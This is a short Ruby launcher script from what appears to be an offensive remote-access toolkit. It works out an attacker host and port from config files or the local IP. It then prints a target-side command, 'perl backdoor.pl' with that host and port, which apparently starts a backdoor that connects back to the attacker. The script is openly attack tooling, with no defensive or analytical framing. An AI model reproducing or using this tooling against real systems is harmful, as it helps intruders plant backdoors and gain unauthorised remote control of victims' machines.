#!/usr/bin/env ruby

require 'socket'

object_path = "/usr/local/share/OpenRAF"
lhost = ""
lport = ""

def local_ip
    orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
    UDPSocket.open do |s|
        s.connect '192.168.1.1', 1
        s.addr.last
    end
ensure
    Socket.do_not_reverse_lookup = orig
end

if File.exists? "#{object_path}/vps/host.txt"
    File.readlines("#{object_path}/vps/host.txt").each do |lhost_line|
        lhost = lhost_line
    end
    File.readlines("#{object_path}/vps/port.txt").each do |lport_line|
        lport = lport_line
    end
else
    lhost = local_ip
    lport = "8080"
end

puts "===================="
puts "Attacker Information"
puts "===================="
puts ""
puts "Attacker host: #{lhost}"
puts "Attacker port: #{lport}"
puts ""
puts "=================="
puts "Target Information"
puts "=================="
puts ""
puts "perl backdoor.pl #{lhost} #{lport}"
puts ""
puts "Press any key to continue..."
gets()
